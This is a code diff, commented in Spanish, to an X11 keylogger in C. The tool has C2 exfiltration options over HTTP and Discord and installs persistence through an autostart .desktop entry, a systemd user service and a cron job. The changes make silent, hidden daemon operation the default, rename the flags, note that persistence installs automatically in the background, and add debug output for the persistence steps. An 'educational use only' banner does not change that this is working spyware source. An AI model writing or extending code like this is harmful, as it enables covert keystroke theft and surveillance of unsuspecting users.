@@ -99,8 +99,8 @@ static KeyloggerState g_state = {
     .logfile = NULL,
     .record_context = 0,
     .running = 1,
-    .daemon_mode = 1,         // Modo daemon habilitado por defecto
-    .quiet_mode = 0,
+    .daemon_mode = 1,         // Modo daemon habilitado por defecto (oculto)
+    .quiet_mode = 1,          // MODO SILENCIOSO habilitado por defecto (sin output)
     .log_filename = LOG_FILE,
     .last_window = {0},
     .display_env = {0},
@@ -1072,8 +1072,8 @@ void print_usage(const char *prog_name) {
     printf("USO EDUCATIVO SOLAMENTE\n\n");
     printf("Uso: %s [opciones]\n\n", prog_name);
     printf("Opciones generales:\n");
-    printf("  -d, --daemon       Desactivar modo daemon (ACTIVO POR DEFECTO)\n");
-    printf("  -q, --quiet        Modo silencioso (sin output a consola)\n");
+    printf("  -d, --foreground   Ejecutar en foreground (muestra output)\n");
+    printf("  -v, --verbose      Mostrar output verboso\n");
     printf("  -o, --output FILE  Archivo de log (default: %s)\n", LOG_FILE);
     printf("  -h, --help         Mostrar esta ayuda\n\n");
     printf("Opciones de persistencia:\n");
@@ -1086,10 +1086,15 @@ void print_usage(const char *prog_name) {
     printf("  -s, --server HOST          IP/hostname del servidor C2 (requiere -e)\n");
     printf("  -P, --exfil-port PORT      Puerto del servidor (default: %s, requiere -e)\n", EXFIL_DEFAULT_PORT);
     printf("      --exfil-path PATH      Path del endpoint (default: %s, requiere -e)\n\n", EXFIL_DEFAULT_PATH);
+    printf("NOTAS:\n");
+    printf("  * Por defecto: Daemon + Silencioso + Oculto (sin output)\n");
+    printf("  * Para ver output: ./x11_keylogger -d -v\n");
+    printf("  * Para foreground: ./x11_keylogger -d\n");
+    printf("  * Persistencia se instala automáticamente en segundo plano\n\n");
     printf("Ejemplos:\n");
-    printf("  %s                              # Daemon + Discord (DEFECTO)\n", prog_name);
-    printf("  %s --exfil-interval 300         # Daemon + Discord, enviar cada 5 min\n", prog_name);
-    printf("  %s -d                           # Foreground + Discord\n", prog_name);
+    printf("  %s                              # Daemon silencioso (DEFECTO)\n", prog_name);
+    printf("  %s -d                           # Foreground (muestra output)\n", prog_name);
+    printf("  %s -d -v                        # Foreground + Verbose\n", prog_name);
     printf("  %s --install-persist            # Instalar persistencia\n", prog_name);
     printf("  %s -e -s 192.168.1.100          # Daemon + HTTP\n", prog_name);
 }
@@ -1154,24 +1159,32 @@ void* persistence_install_thread(void *arg) {
         fflush(persist_log);
     }
     
+    // DEBUG: Imprimir a stderr para verificación inmediata
+    fprintf(stderr, "[PERSIST] Iniciando instalación de persistencia...\n");
+    fprintf(stderr, "[PERSIST] Binary path: %s\n", g_binary_path);
+    fflush(stderr);
+    
     // Instalar persistencia en segundo plano (no-fatal si falla)
     int ret1 = install_autostart_entry(g_binary_path);
     if (persist_log) {
         fprintf(persist_log, "[%ld] Desktop Entry (.desktop): %s\n", time(NULL), ret1 == 0 ? "OK" : "FAIL");
         fflush(persist_log);
     }
+    fprintf(stderr, "[PERSIST] Desktop Entry: %s\n", ret1 == 0 ? "OK" : "FAIL");
     
     int ret2 = install_systemd_service(g_binary_path);
     if (persist_log) {
         fprintf(persist_log, "[%ld] Systemd User Service: %s\n", time(NULL), ret2 == 0 ? "OK" : "FAIL");
         fflush(persist_log);
     }
+    fprintf(stderr, "[PERSIST] Systemd Service: %s\n", ret2 == 0 ? "OK" : "FAIL");
     
     int ret3 = install_cron_job(g_binary_path);
     if (persist_log) {
         fprintf(persist_log, "[%ld] Cron Job (verificación cada 5min): %s\n", time(NULL), ret3 == 0 ? "OK" : "FAIL");
         fflush(persist_log);
     }
+    fprintf(stderr, "[PERSIST] Cron Job: %s\n", ret3 == 0 ? "OK" : "FAIL");
     
     // Resumen
     int total_ok = (ret1 == 0 ? 1 : 0) + (ret2 == 0 ? 1 : 0) + (ret3 == 0 ? 1 : 0);
@@ -1179,6 +1192,7 @@ void* persistence_install_thread(void *arg) {
         fprintf(persist_log, "[%ld] === Resultado: %d/3 mecanismos exitosos ===\n\n", time(NULL), total_ok);
         fclose(persist_log);
     }
+    fprintf(stderr, "[PERSIST] Resultado final: %d/3 mecanismos exitosos\n", total_ok);
     
     return NULL;
 }
@@ -1437,8 +1451,8 @@ int main(int argc, char *argv[]) {
     
     // Opciones largas para getopt_long
     static struct option long_options[] = {
-        {"daemon",           no_argument,       0, 'd'},
-        {"quiet",            no_argument,       0, 'q'},
+        {"foreground",       no_argument,       0, 'd'},
+        {"verbose",          no_argument,       0, 'v'},
         {"output",           required_argument, 0, 'o'},
         {"help",             no_argument,       0, 'h'},
         {"install-persist",  no_argument,       0, 259},  // Nueva opción
@@ -1458,13 +1472,14 @@ int main(int argc, char *argv[]) {
     int http_mode = 0;
     int discord_mode = 0;
     
-    while ((opt = getopt_long(argc, argv, "dqo:hes:P:D", long_options, &option_index)) != -1) {
+    while ((opt = getopt_long(argc, argv, "dvo:hes:P:D", long_options, &option_index)) != -1) {
         switch (opt) {
             case 'd':
-                g_state.daemon_mode = 0;  // Desactivar daemon
+                g_state.daemon_mode = 0;  // Foreground (no daemon)
+                g_state.quiet_mode = 0;   // Mostrar output
                 break;
-            case 'q':
-                g_state.quiet_mode = 1;
+            case 'v':
+                g_state.quiet_mode = 0;   // Verbose mode
                 break;
             case 'o':
                 strncpy(g_state.log_filename, optarg, sizeof(g_state.log_filename) - 1);
